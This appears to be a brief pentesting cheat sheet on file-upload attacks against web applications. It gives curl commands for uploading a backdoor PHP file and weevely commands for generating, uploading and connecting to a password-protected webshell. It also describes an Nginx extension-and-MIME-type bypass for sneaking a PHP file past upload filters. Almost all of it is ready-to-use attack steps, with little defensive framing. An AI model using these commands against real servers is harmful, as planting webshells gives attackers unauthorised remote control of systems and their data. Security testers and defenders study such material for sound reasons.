#### curl
- `curl <http> --upload-file <path>` - PUT request; use it to upload malicious file
- `curl -k -X POST -F "action=upload" -F "files=@./backdoor.php" <URL>`

#### Webshell generator
* `weevely generate <password> <path>`
    * upload the generate file to vulnerable app
* `weevely <uploaded vulnerable URL>/<payload.jpg>/<payload.php> <password>` - grants a pseudoshell

### Bypasses
#### Nginx
* https://vulnerable/simple-backdoor.png/simple-backdoor.php
    * upload a php file and change the extension to png
    * append the original pgp name at the end of the URL
    * extra: in the original bypass upload request, change the mime-type to _application/x-php_
